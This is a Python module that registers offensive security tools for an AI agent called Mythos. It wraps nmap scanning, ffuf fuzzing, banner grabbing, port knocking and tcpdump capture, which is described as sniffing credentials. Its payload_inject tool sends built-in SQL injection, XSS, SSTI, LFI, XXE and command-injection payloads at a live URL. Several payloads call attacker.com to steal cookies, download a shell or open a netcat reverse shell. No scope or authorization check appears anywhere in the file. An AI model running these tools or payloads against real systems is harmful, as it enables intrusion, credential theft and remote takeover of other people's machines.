"""Red-team offensive tools for Mythos agent.

Nmap scanning, ffuf fuzzing, traffic capture, payload injection,
port knocking, banner grabbing. Wraps system binaries; falls back
gracefully when tools are missing.
"""

import asyncio
import json
import logging
import os
import tempfile
import time
from pathlib import Path

from . import ToolCategory, ToolDefinition, ToolSafety, register_tool

logger = logging.getLogger(__name__)


# ─── Helpers ───

def _resolve_path(path: str) -> Path:
    p = Path(path)
    if not p.is_absolute():
        p = Path.cwd() / p
    return p.resolve()


async def _run(cmd: list[str], cwd: str | None = None, timeout: int = 120) -> dict:
    """Run a command and return {ok, stdout, stderr, exit_code}."""
    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            cwd=cwd,
        )
        stdout, stderr = await asyncio.wait_for(
            proc.communicate(), timeout=timeout
        )
        return {
            "ok": proc.returncode == 0,
            "stdout": stdout.decode("utf-8", errors="replace")[:12000],
            "stderr": stderr.decode("utf-8", errors="replace")[:4000],
            "exit_code": proc.returncode,
        }
    except asyncio.TimeoutError:
        return {"ok": False, "stdout": "", "stderr": f"Timeout after {timeout}s", "exit_code": -1}
    except FileNotFoundError:
        return {"ok": False, "stdout": "", "stderr": f"Command not found: {cmd[0]}", "exit_code": -2}
    except Exception as e:
        return {"ok": False, "stdout": "", "stderr": str(e), "exit_code": -3}


# ─── Tools ───

async def nmap_scan(
    target: str,
    ports: str = "top-1000",
    scan_type: str = "syn",
    extra_args: str = "",
    timeout: int = 300,
) -> dict:
    """Port scan a target with nmap.
    
    Args:
        target: IP, hostname, or CIDR range.
        ports: Port spec ('top-1000', '1-65535', '22,80,443', 'all').
        scan_type: 'syn' (-sS stealth), 'tcp' (-sT connect), 'udp' (-sU),
                   'quick' (-T4 -F), 'full' (-p- -sV -sC).
        extra_args: Additional raw nmap arguments.
        timeout: Timeout in seconds.
    
    Returns scan results with open ports and service details.
    """
    cmd = ["nmap"]

    if scan_type == "syn":
        cmd.append("-sS")
    elif scan_type == "tcp":
        cmd.append("-sT")
    elif scan_type == "udp":
        cmd.append("-sU")
    elif scan_type == "quick":
        cmd.extend(["-T4", "-F"])
    elif scan_type == "full":
        cmd.extend(["-p-", "-sV", "-sC", "-T4"])

    if ports == "all":
        cmd.append("-p-")
    elif ports != "top-1000":
        cmd.extend(["-p", ports])

    # Service/OS detection for detailed scans
    if scan_type in ("syn", "tcp", "full"):
        cmd.extend(["-sV", "--version-intensity", "5"])

    # Always use -Pn (no ping) for speed
    cmd.append("-Pn")

    # Output in XML for parsing, but also keep normal output
    cmd.extend(["-oX", "-"])  # XML to stdout

    if extra_args:
        cmd.extend(extra_args.split())

    cmd.append(target)

    out = await _run(cmd, timeout=timeout)
    if out["exit_code"] == -2:
        return {"ok": False, "error": "nmap not installed. Install: sudo apt install nmap"}
    
    return {
        "ok": out["ok"],
        "target": target,
        "scan_type": scan_type,
        "ports": ports,
        "output": out["stdout"] or out["stderr"],
        "exit_code": out["exit_code"],
    }


async def ffuf_fuzz(
    url: str,
    wordlist: str = "common",
    mode: str = "dir",
    extensions: str = "",
    filter_status: str = "",
    match_status: str = "200,204,301,302,307,401,403,405,500",
    timeout: int = 300,
) -> dict:
    """Fuzz directories, files, parameters, or virtual hosts with ffuf.
    
    Args:
        url: Target URL with FUZZ keyword (e.g. 'https://target.com/FUZZ').
        wordlist: 'common', 'raft', 'api', 'params', or path to custom wordlist.
        mode: 'dir' (directory/file), 'vhost' (virtual host), 'param' (parameter discovery).
        extensions: Comma-separated extensions ('php,asp,html,bak').
        filter_status: HTTP status codes to filter OUT.
        match_status: HTTP status codes to match IN.
        timeout: Timeout in seconds.
    
    Returns discovered paths/params with status codes and sizes.
    """
    cmd = ["ffuf", "-u", url, "-t", "50"]

    # Wordlist selection
    wordlist_paths = {
        "common": "/usr/share/wordlists/dirb/common.txt",
        "raft": "/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt",
        "api": "/usr/share/seclists/Discovery/Web-Content/api-endpoints.txt",
        "params": "/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt",
    }
    wl = wordlist_paths.get(wordlist, wordlist)
    cmd.extend(["-w", wl])

    if mode == "vhost":
        cmd.extend(["-H", f"Host: FUZZ"])
    elif mode == "param":
        # For param discovery, we fuzz parameter names
        cmd.extend(["-X", "GET"])

    if extensions:
        cmd.extend(["-e", extensions])

    if filter_status:
        cmd.extend(["-fc", filter_status])
    if match_status:
        cmd.extend(["-mc", match_status])

    # JSON output for parsing
    cmd.extend(["-of", "json"])

    out = await _run(cmd, timeout=timeout)
    if out["exit_code"] == -2:
        return {"ok": False, "error": "ffuf not installed. Install: go install github.com/ffuf/ffuf@latest"}

    return {
        "ok": out["ok"],
        "url": url,
        "mode": mode,
        "wordlist": wordlist,
        "output": out["stdout"] or out["stderr"],
    }


async def banner_grab(
    target: str,
    port: int = 80,
    protocol: str = "tcp",
    timeout: int = 15,
) -> dict:
    """Grab service banner from a target:port.
    
    Args:
        target: IP or hostname.
        port: Target port.
        protocol: 'tcp', 'udp', 'http', 'https', 'ssh', 'ftp', 'smtp', 'mysql', 'all'.
        timeout: Per-connection timeout in seconds.
    
    Returns service banner and fingerprint info.
    """
    results: list[dict] = []

    async def grab_tcp(host: str, p: int, probe: bytes = b"", read_timeout: int = 5) -> str | None:
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, p), timeout=timeout
            )
            if probe:
                writer.write(probe)
                await writer.drain()
            banner = await asyncio.wait_for(reader.read(4096), timeout=read_timeout)
            writer.close()
            return banner.decode("utf-8", errors="replace").strip()
        except Exception as e:
            return f"[connection error: {e}]"

    probes = {
        "http": b"GET / HTTP/1.0\r\nHost: %s\r\n\r\n" % target.encode(),
        "https": b"",  # would need TLS — skip for raw banner
        "ssh": b"",
        "ftp": b"",
        "smtp": b"EHLO mythos\r\n",
        "mysql": b"",
    }

    if protocol in ("tcp", "all"):
        if port in (80, 8080, 8000):
            banner = await grab_tcp(target, port, probes["http"])
        elif port == 443:
            banner = await grab_tcp(target, port)
        else:
            banner = await grab_tcp(target, port)
        if banner:
            results.append({"protocol": "tcp", "port": port, "banner": banner[:2000]})

    if protocol == "http" or (protocol == "all" and port in (80, 8080, 8000)):
        banner = await grab_tcp(target, port, probes["http"])
        if banner:
            results.append({"protocol": "http", "port": port, "banner": banner[:2000]})

    if protocol == "ssh" or (protocol == "all" and port == 22):
        banner = await grab_tcp(target, 22)
        if banner:
            results.append({"protocol": "ssh", "port": 22, "banner": banner[:500]})

    if not results:
        # Fallback: try nmap service detection
        out = await _run(["nmap", "-sV", "-p", str(port), "--script", "banner", target], timeout=30)
        if out["ok"]:
            results.append({"protocol": "nmap_sV", "port": port, "banner": out["stdout"][:2000]})

    return {
        "ok": True,
        "target": target,
        "port": port,
        "results": results,
    }


async def payload_inject(
    url: str,
    vector: str,
    param: str = "",
    method: str = "GET",
    payloads: str = "auto",
    count: int = 15,
    timeout: int = 60,
) -> dict:
    """Inject attack payloads into a live target and analyze responses.
    
    Args:
        url: Target URL.
        vector: Attack vector — 'sqli', 'xss', 'cmdi', 'ssti', 'xxe', 'lfi', 'traversal'.
        param: Parameter name to inject into. Empty = inject in URL path.
        method: HTTP method.
        payloads: 'auto' for built-in payload set for the vector, or JSON array of custom payloads.
        count: Max payloads to try.
        timeout: Total timeout.
    
    Returns per-payload results with response analysis.
    """
    import httpx

    # Payload sets per vector
    payload_sets = {
        "sqli": [
            "'", "\"", "1'", "1\"", "' OR '1'='1", "\" OR \"1\"=\"1",
            "' OR 1=1--", "\" OR 1=1--", "admin'--", "admin' #",
            "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--", "' UNION SELECT NULL,NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
            "1' AND 1=1--", "1' AND 1=2--", "1' AND SLEEP(5)--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "1' ORDER BY 1--", "1' ORDER BY 2--", "1' ORDER BY 10--",
            "1' ORDER BY 20--", "1' ORDER BY 50--",
            "-1' UNION SELECT 1,2,3--", "-1' UNION SELECT 1,2,3,4--",
            "-1' UNION SELECT 1,@@version,3--",
        ],
        "xss": [
            "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
            "\"><script>alert(1)</script>", "'><script>alert(1)</script>",
            "<svg onload=alert(1)>", "<body onload=alert(1)>",
            "javascript:alert(1)", "<iframe src=javascript:alert(1)>",
            "<img src=x onerror=fetch('http://attacker.com/'+document.cookie)>",
            "\"><img src=x onerror=alert(1)>",
        ],
        "cmdi": [
            ";id", "|id", "||id", "&id", "&&id",
            "\nid", "%0aid", "%0d%0aid",
            "`id`", "$(id)", "${id}",
            ";ls -la", "|ls -la", ";cat /etc/passwd",
            ";wget http://attacker.com/shell", ";curl http://attacker.com/shell",
            ";nc -e /bin/sh attacker.com 4444",
        ],
        "ssti": [
            "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}",
            "{{config}}", "{{self}}", "{{''.__class__.__mro__[1].__subclasses__()}}",
            "{{''.__class__.__mro__[2].__subclasses__()}}",
        ],
        "lfi": [
            "/etc/passwd", "../../../../etc/passwd",
            "....//....//....//etc/passwd",
            "/etc/passwd%00", "../../../../etc/passwd%00",
            "php://filter/convert.base64-encode/resource=index",
            "file:///etc/passwd",
        ],
        "xxe": [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>',
        ],
    }

    if payloads == "auto":
        plist = payload_sets.get(vector, ["'", "\"", "<script>", ";id", "{{7*7}}"])
    else:
        try:
            plist = json.loads(payloads)
        except json.JSONDecodeError:
            return {"ok": False, "error": "Invalid payloads JSON"}

    plist = plist[:count]
    results: list[dict] = []

    async with httpx.AsyncClient(timeout=10.0, follow_redirects=False) as client:
        for payload in plist:
            try:
                if method == "GET":
                    if param:
                        target_url = f"{url}?{param}={payload}"
                    else:
                        target_url = f"{url}{payload}"
                    resp = await client.get(target_url)
                elif method == "POST":
                    if param:
                        resp = await client.post(url, data={param: payload})
                    else:
                        resp = await client.post(url, data=payload)
                else:
                    resp = await client.request(method, url, data={param: payload} if param else payload)

                # Analyze response
                anomalies = []
                text_lower = resp.text.lower()[:2000]
                if "sql" in text_lower or "syntax" in text_lower or "mysql" in text_lower or "postgres" in text_lower:
                    anomalies.append("sql_error_leak")
                if payload in resp.text and vector == "xss":
                    anomalies.append("xss_reflected")
                if "uid=" in resp.text or "root:" in resp.text:
                    anomalies.append("command_output_leak")
                if "49" in resp.text and payload == "{{7*7}}" and vector == "ssti":
                    anomalies.append("ssti_confirmed_49")
                if "root:" in resp.text and vector == "lfi":
                    anomalies.append("lfi_confirmed_passwd")
                if resp.status_code >= 500:
                    anomalies.append("server_error")

                results.append({
                    "payload": payload[:200],
                    "status": resp.status_code,
                    "response_len": len(resp.text),
                    "response_preview": resp.text[:300],
                    "anomalies": anomalies,
                })
            except Exception as e:
                results.append({
                    "payload": payload[:200],
                    "error": str(e)[:200],
                })

    return {
        "ok": True,
        "url": url,
        "vector": vector,
        "param": param,
        "attempts": len(results),
        "results": results,
    }


async def traffic_capture(
    interface: str = "any",
    duration: int = 30,
    filter_expr: str = "",
    count: int = 50,
) -> dict:
    """Capture and analyze network traffic using tcpdump.
    
    Args:
        interface: Network interface ('any', 'eth0', 'wlan0').
        duration: Capture duration in seconds.
        filter_expr: BPF filter expression ('tcp port 80', 'host 192.168.1.1').
        count: Max packets to capture.
    
    Returns captured packets summary.
    """
    cmd = ["tcpdump", "-i", interface, "-c", str(count), "-n", "-q"]
    if filter_expr:
        cmd.append(filter_expr)

    out = await _run(cmd, timeout=duration + 10)
    if out["exit_code"] == -2:
        return {"ok": False, "error": "tcpdump not installed. Install: sudo apt install tcpdump"}

    # Parse interesting patterns
    creds_patterns = ["Authorization:", "Cookie:", "Set-Cookie:", "password", "token", "key"]
    cred_hits = [line for line in out["stdout"].split("\n") if any(p.lower() in line.lower() for p in creds_patterns)]

    return {
        "ok": out["ok"],
        "interface": interface,
        "duration": duration,
        "packets_captured": min(count, out["stdout"].count("\n")),
        "credential_hints": len(cred_hits),
        "output": out["stdout"][:8000],
    }


async def port_knock(
    target: str,
    sequence: str,
    delay: float = 0.5,
    protocol: str = "tcp",
) -> dict:
    """Execute a port knocking sequence to open hidden services.
    
    Args:
        target: IP or hostname.
        sequence: Comma-separated port sequence ('7000,8000,9000').
        delay: Delay between knocks in seconds.
        protocol: 'tcp' or 'udp'.
    
    Returns knock result.
    """
    ports = [int(p.strip()) for p in sequence.split(",") if p.strip().isdigit()]
    if not ports:
        return {"ok": False, "error": f"Invalid port sequence: {sequence}"}

    results: list[dict] = []
    for i, port in enumerate(ports):
        try:
            if protocol == "tcp":
                _, writer = await asyncio.wait_for(
                    asyncio.open_connection(target, port), timeout=5
                )
                writer.close()
                results.append({"port": port, "status": "knocked"})
            else:
                # UDP knock — just send empty datagram
                transport, _ = await asyncio.get_event_loop().create_datagram_endpoint(
                    lambda: asyncio.DatagramProtocol(),
                    remote_addr=(target, port),
                )
                transport.sendto(b"\x00")
                transport.close()
                results.append({"port": port, "status": "knocked (udp)"})
        except Exception as e:
            results.append({"port": port, "status": f"failed: {e}"})

        if i < len(ports) - 1:
            await asyncio.sleep(delay)

    return {
        "ok": True,
        "target": target,
        "sequence": ports,
        "protocol": protocol,
        "results": results,
    }


# ─── Registration ───

register_tool(ToolDefinition(
    name="nmap_scan",
    description="Port scan a target with nmap. Stealth SYN scan, full TCP, UDP, or quick scans. Returns open ports and service versions.",
    parameters={
        "type": "object",
        "properties": {
            "target": {"type": "string", "description": "Target IP, hostname, or CIDR range."},
            "ports": {"type": "string", "description": "Port spec: 'top-1000', '1-65535', '22,80,443', 'all'. Default: top-1000."},
            "scan_type": {"type": "string", "enum": ["syn", "tcp", "udp", "quick", "full"], "description": "Scan type. Default: syn."},
            "extra_args": {"type": "string", "description": "Additional raw nmap args."},
            "timeout": {"type": "integer", "description": "Timeout in seconds. Default: 300."},
        },
        "required": ["target"],
    },
    safety=ToolSafety.DESTRUCTIVE,
    executor=nmap_scan,
    category=ToolCategory.SECURITY,
))

register_tool(ToolDefinition(
    name="ffuf_fuzz",
    description="Fuzz directories, files, virtual hosts, or parameters with ffuf. Web content discovery at scale.",
    parameters={
        "type": "object",
        "properties": {
            "url": {"type": "string", "description": "Target URL with FUZZ keyword (e.g. 'https://target.com/FUZZ')."},
            "wordlist": {"type": "string", "description": "Wordlist: 'common', 'raft', 'api', 'params', or custom path. Default: common."},
            "mode": {"type": "string", "enum": ["dir", "vhost", "param"], "description": "Fuzz mode. Default: dir."},
            "extensions": {"type": "string", "description": "File extensions: 'php,asp,html,bak,zip'."},
            "filter_status": {"type": "string", "description": "HTTP status codes to filter OUT."},
            "match_status": {"type": "string", "description": "HTTP status codes to match IN. Default: 200,204,301,302,307,401,403,405,500."},
            "timeout": {"type": "integer", "description": "Timeout in seconds. Default: 300."},
        },
        "required": ["url"],
    },
    safety=ToolSafety.DESTRUCTIVE,
    executor=ffuf_fuzz,
    category=ToolCategory.SECURITY,
))

register_tool(ToolDefinition(
    name="banner_grab",
    description="Grab service banner from a target:port. Fingerprint services for version-based exploit matching.",
    parameters={
        "type": "object",
        "properties": {
            "target": {"type": "string", "description": "Target IP or hostname."},
            "port": {"type": "integer", "description": "Target port. Default: 80."},
            "protocol": {"type": "string", "enum": ["tcp", "http", "ssh", "all"], "description": "Protocol for probe. Default: tcp."},
            "timeout": {"type": "integer", "description": "Timeout seconds. Default: 15."},
        },
        "required": ["target"],
    },
    safety=ToolSafety.DESTRUCTIVE,
    executor=banner_grab,
    category=ToolCategory.SECURITY,
))

register_tool(ToolDefinition(
    name="payload_inject",
    description="Inject attack payloads (SQLi, XSS, CMDi, SSTI, LFI, XXE) into a live target and analyze responses for anomalies.",
    parameters={
        "type": "object",
        "properties": {
            "url": {"type": "string", "description": "Target URL."},
            "vector": {"type": "string", "enum": ["sqli", "xss", "cmdi", "ssti", "lfi", "xxe"], "description": "Attack vector."},
            "param": {"type": "string", "description": "Parameter to inject into. Empty = URL path injection."},
            "method": {"type": "string", "enum": ["GET", "POST", "PUT"], "description": "HTTP method. Default: GET."},
            "payloads": {"type": "string", "description": "'auto' for built-in payload set, or JSON array of custom payloads."},
            "count": {"type": "integer", "description": "Max payloads to try. Default: 15."},
            "timeout": {"type": "integer", "description": "Total timeout. Default: 60."},
        },
        "required": ["url", "vector"],
    },
    safety=ToolSafety.DESTRUCTIVE,
    executor=payload_inject,
    category=ToolCategory.SECURITY,
))

register_tool(ToolDefinition(
    name="traffic_capture",
    description="Capture and analyze network traffic with tcpdump. Sniff credentials, map internal services, monitor target traffic.",
    parameters={
        "type": "object",
        "properties": {
            "interface": {"type": "string", "description": "Network interface. Default: any."},
            "duration": {"type": "integer", "description": "Capture seconds. Default: 30."},
            "filter_expr": {"type": "string", "description": "BPF filter: 'tcp port 80', 'host 192.168.1.1'."},
            "count": {"type": "integer", "description": "Max packets. Default: 50."},
        },
        "required": [],
    },
    safety=ToolSafety.DESTRUCTIVE,
    executor=traffic_capture,
    category=ToolCategory.SECURITY,
))

register_tool(ToolDefinition(
    name="port_knock",
    description="Execute port knocking sequence to open hidden services behind knockd or similar.",
    parameters={
        "type": "object",
        "properties": {
            "target": {"type": "string", "description": "Target IP or hostname."},
            "sequence": {"type": "string", "description": "Comma-separated port sequence: '7000,8000,9000'."},
            "delay": {"type": "number", "description": "Delay between knocks in seconds. Default: 0.5."},
            "protocol": {"type": "string", "enum": ["tcp", "udp"], "description": "Protocol. Default: tcp."},
        },
        "required": ["target", "sequence"],
    },
    safety=ToolSafety.DESTRUCTIVE,
    executor=port_knock,
    category=ToolCategory.SECURITY,
))
